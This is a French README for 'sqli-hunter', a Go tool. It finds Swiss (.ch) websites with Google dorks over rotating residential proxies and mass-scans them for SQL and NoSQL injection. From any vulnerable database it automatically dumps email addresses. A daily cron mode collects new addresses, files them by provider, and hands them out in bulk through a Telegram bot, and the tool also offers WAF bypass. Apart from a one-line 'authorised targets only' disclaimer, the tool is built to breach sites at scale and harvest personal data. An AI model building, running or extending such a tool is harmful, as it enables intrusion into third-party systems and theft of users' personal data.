# sqli-hunter

Scanner CLI en **Go** dédié aux **injections donnant accès à la base de données**.

## Cible : accès DB uniquement

| Type | Objectif |
|------|----------|
| **SQLi error-based** | Erreurs SQL → requêtes injectables |
| **SQLi union-based** | Extraction `version()`, `database()`, `information_schema` |
| **SQLi boolean-blind** | Manipulation de requêtes SELECT |
| **SQLi time-blind** | Exécution de requêtes temporisées (`--full`) |
| **NoSQL injection** | Bypass auth MongoDB, accès collections |

Payloads orientés **extraction de métadonnées DB** : version, schémas, tables, utilisateurs.

## Listes d'URLs (bulk)

```bash
# Fichier urls.txt — une URL par ligne, paramètres dans la query
# https://target.com/page?id=1
# https://api.example.com/users?uid=42

./sqli-hunter -l urls.txt --url-threads 8 -o results.json
```

| Option | Description | Défaut |
|--------|-------------|--------|
| `-l, --list` | Fichier d'URLs | — |
| `-o, --output` | Répertoire de sortie | `results` |
| `--url-threads` | URLs scannées en parallèle | 4 |
| `--threads` | Workers scan par URL | 8 |
| `--extract-threads` | Workers extraction | 2 |

En mode liste : progression `[42/1240]`, vulns affichées immédiatement, résumé final compact.

## Extraction de données

Dès qu'une vulnérabilité est détectée, l'outil lance automatiquement l'extraction sur des **workers dédiés** (séparés des threads de scan). Le scan continue en parallèle sans bloquer.

| Option | Description | Défaut |
|--------|-------------|--------|
| `--threads` | Goroutines de scan | 8 |
| `--extract-threads` | Workers d'extraction | 2 |

### Données extraites (mode email — profil **Suisse**)

L'extraction ne récupère que les **emails valides** :

| Champ | Colonnes détectées | Validation |
|-------|-------------------|------------|
| Email | `email`, `mail`, `e_mail`… | regex stricte + blocklist |

Exemple de sortie (`results/emails/bluewin.ch.txt`) :

```
hans.meier@bluewin.ch
marie.mueller@bluewin.ch
```

**Emails par fournisseur** — un fichier `.txt` par domaine email (`gmail.com.txt`, `bluewin.ch.txt`…), une adresse par ligne dans `results/emails/`.

```bash
sqli-hunter ch --url-threads 64
```

### Données extraites (--extract-meta)

- Version DB (`@@version`, `version()`)
- Nom de la base (`database()`, `current_database()`)
- Utilisateur DB (`user()`, `system_user`)
- Tables (`information_schema`, `sqlite_master`)
- Dump NoSQL (collections MongoDB)

## Mode daily (recommandé)

Une commande, tous les jours, **seulement les nouveaux emails** :

```bash
sqli-hunter
# ou
sqli-hunter daily
```

Cron (tous les jours à 3h) :
```bash
0 3 * * * cd /chemin/sqli-hunter && ./sqli-hunter daily >> daily.log 2>&1
```

Ce que fait le mode daily :
1. **Discover Google** — dorks `.ch` via [OpenSerp API](https://openserp.dev/docs) (`OPENSERP_API_KEY`)
2. **Curseur daily** — avance dans `results/discover_cursor.json`
3. **Rotation dorks** — ordre des requêtes changé chaque jour
4. Ignore domaines déjà dumpés + URLs déjà scannées
5. Scan + extraction emails
6. **Dédup** — n'ajoute que les emails pas encore dans `results/emails/`

Fichiers d'état :
- `results/discover_cursor.json` — position Google pour le prochain daily
- `results/scanned_urls.txt` — URLs déjà testées
- `results/dumped_domains.txt` — sites déjà dumpés
- `results/emails/*.txt` — stock cumulé

## Découverte d'URLs (`discover`)

Collecte via **Google** + **proxy BP résidentiel** (`DISCOVER_PROXY` — IP rotative côté fournisseur).

```bash
# sqli-hunter.env
DISCOVER_PROXY=http://user:pass:residential.bpproxy.at:1000
./sqli-hunter daily
```

| `--source` | Moteur |
|------------|--------|
| `google` | Scraping Google via proxy BP [défaut] |
| `duckduckgo` | DDG HTML scraping |
| `google` + `SERPAPI_API_KEY` | SerpAPI (optionnel) |
| `wayback` | Archive (1 domaine) |

Variables (`sqli-hunter.env`) :
- `DISCOVER_PROXY` — proxy BP rotatif **obligatoire pour Google**
- `SERPAPI_API_KEY` — optionnel, remplace le scraping si configuré
- `DISCOVER_PROXIES` — liste optionnelle (virgule / ligne)

| Option | Description |
|--------|-------------|
| `--paths` | Filtre manuel path (optionnel) |
| `--params` | Filtre manuel paramètres (optionnel) |
| `--no-filter` | Toutes URLs .ch avec `?param=` |
| `--subs` / `--no-subs` | Sous-domaines [défaut: oui] |
| `--rescan` | Inclure domaines déjà dumpés |
| `-o` | Fichier sortie [défaut: `scope_DOMAIN.ch.txt`] |
| `--scan` | Lance le scan après collecte |

**Anti re-dump** : les domaines dumpés sont enregistrés dans `results/dumped_domains.txt` et ignorés automatiquement (discover + scan).

**Validation emails** : regex stricte + blocklist (0 FP) — re-validée à l'écriture.

## Scan massif (1k – 100k URLs)

Le mode `-l` utilise le **streaming** : les URLs ne sont pas chargées en mémoire.

```bash
# 50 000 URLs — auto mass si ≥ 500 URLs
sqli-hunter -l scope.txt --url-threads 64

# 100k URLs — progression tous les 500
sqli-hunter -l big_scope.txt --mass --url-threads 64 --progress-every 500
```

| Paramètre | Défaut | Mass auto (≥500 URLs) |
|-----------|--------|------------------------|
| `--url-threads` | 4 | **32** (64 si ≥10k) |
| `--progress-every` | 100 | 100 |
| Mémoire | streaming | écriture disque au fil de l'eau |

- Résultats écrits **immédiatement** dans `results/emails/` (un fichier par fournisseur)
- Affichage compact : progression + vulns uniquement
- Pool HTTP optimisé (500 connexions idle)

## Sortie des résultats

Seuls les **emails** sont écrits sur disque, un fichier par fournisseur dans `results/emails/` :

```
results/
  emails/
    bluewin.ch.txt
    gmail.com.txt
    icloud.com.txt
```

Une adresse par ligne, sans préfixe ni rapport JSON/SQL par site.

```bash
./sqli-hunter -l urls.txt                    # → results/emails/
./sqli-hunter -u "https://x.com/p?id=1" -o results
```

## Bot Telegram (export emails)

Envoie les emails extraits en fichier `.txt` sur demande.

```bash
# 1. Config locale (token + whitelist)
cp tg-bot.env.example tg-bot.env
# Éditer tg-bot.env → token + ton ID Telegram

# 2. Lancer le bot
go build -o tg-bot ./cmd/tg-bot
./tg-bot
```

**Whitelist obligatoire** — seuls les IDs dans `TELEGRAM_ALLOWED_IDS` ont accès.
Envoie `/myid` au bot pour obtenir ton ID Telegram, puis ajoute-le dans `tg-bot.env`.

```
/myid   → ton ID Telegram (toujours accessible)
/start  → stock + boutons Extraire → fournisseur → quantité
```

L'extraction se fait **uniquement via les boutons** (pas de commande texte).

**Déduplication à l'export** — à chaque extraction le bot :

1. Ignore les doublons dans le fichier fournisseur
2. Ignore les emails déjà envoyés (`results/bot_delivered.txt`)
3. Retire les emails livrés du stock (`results/emails/*.txt`)
4. Au démarrage, compacte tous les fichiers (doublons intra/inter-fichiers + déjà livrés)

| Variable | Description |
|----------|-------------|
| `TELEGRAM_BOT_TOKEN` | Token BotFather (dans `tg-bot.env`) |
| `TELEGRAM_ALLOWED_IDS` | **Obligatoire** — IDs autorisés (virgule) |
| `RESULTS_DIR` | Dossier résultats [défaut: `results`] |
| `TELEGRAM_MAX_EMAILS` | Max par requête [défaut: `10000`] |

> Ne commite jamais `tg-bot.env`. Si le token a fuité, régénère-le via @BotFather.

## Installation

```bash
go build -o sqli-hunter ./cmd/sqli-hunter
go build -o tg-bot ./cmd/tg-bot
```

## Usage

```bash
# Scan rapide SQLi + NoSQL
./sqli-hunter -u "https://target.com/page?id=1"

# SQLi uniquement
./sqli-hunter -u "https://target.com/product?id=1" -t sqli

# Union + extraction DB
./sqli-hunter -u "https://target.com/item?id=1" -t union -v

# Scan complet (time-based inclus)
./sqli-hunter -u "https://target.com/api?id=1" --full
```

## Benchmark local — 24 scénarios réalistes

```bash
go run ./cmd/benchmark
go test ./internal/benchmark/... -v
```

### Contextes applicatifs testés

| Contexte | Scénarios | Exemple réel |
|----------|-----------|--------------|
| E-commerce | 3 | testphp.vulnweb.com, fiche produit, recherche |
| Authentification | 3 | DVWA login, Juice Shop MongoDB |
| API REST | 3 | Spring Boot, Node.js JSON, ASP.NET pagination |
| Panel admin | 3 | EXTRACTVALUE, MSSQL search, logs blind |
| Santé | 2 | Oracle patient, SQLite labo |
| Banque | 2 | PostgreSQL relevé, virement blind |
| Blog/CMS | 2 | WordPress slug, UNION database() |
| Legacy PHP | 2 | artists.php, avis POST |
| SaaS B2B | 2 | CRM MSSQL, tenant NoSQL $regex |
| Réservation | 2 | Booking ref, moteur vols PG |
| **Négatifs** | 2 | Page statique, requêtes préparées |

### DBMS couverts

MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB

### Tests unitaires

```bash
go test ./... -v   # 50+ cas : erreurs SQL par DBMS, boolean blind, UNION, NoSQL, faux positifs
```


```bash
./sqli-hunter -u "http://testphp.vulnweb.com/artists.php?artist=1" -t sqli -v
./sqli-hunter -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -t sqli,union
```

## Options

| Option | Description | Défaut |
|--------|-------------|--------|
| `-t, --test` | `sqli`, `nosql`, `error`, `union`, `boolean`, `time` | sqli + nosql |
| `--full` | Scan complet + time-based | off |
| `--waf` | Bypass WAF SQLi | off |

## Avertissement

Utilisez uniquement sur des cibles autorisées (bug bounty, pentest, lab).
